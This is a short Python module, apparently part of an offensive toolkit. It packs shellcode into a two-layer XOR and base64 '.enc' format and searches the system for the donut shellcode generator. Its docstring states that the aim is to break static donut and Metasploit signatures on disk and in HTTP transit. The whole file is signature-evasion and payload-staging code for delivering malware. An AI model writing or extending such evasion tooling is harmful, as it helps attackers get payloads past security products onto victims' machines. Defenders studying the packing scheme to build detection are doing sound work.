import base64
import os
import random
import shutil


def xor_encode(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


def pack_enc(shellcode: bytes, key: int = None) -> bytes:
    """Two-layer XOR .enc: base64(k1 || xor(k2 || xor(sc, k2), k1))
    Neither layer alone reveals the payload — breaks static donut/MSF stub signatures
    both at rest in the .enc file and in transit over HTTP."""
    k2 = random.randint(1, 254)
    inner = bytes([k2]) + xor_encode(shellcode, k2)
    k1 = key if key is not None else random.randint(1, 254)
    return base64.b64encode(bytes([k1]) + xor_encode(inner, k1))


def unpack_enc(data: bytes) -> bytes:
    """Decode two-layer .enc → shellcode."""
    raw  = base64.b64decode(data)
    k1   = raw[0]
    mid  = xor_encode(raw[1:], k1)
    k2   = mid[0]
    return xor_encode(mid[1:], k2)


def find_donut() -> str | None:
    """Locate the donut binary, checking PATH then common fixed paths."""
    for candidate in ("donut", "/opt/donut/donut", "/usr/bin/donut"):
        found = shutil.which(candidate)
        if found:
            return found
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    return None
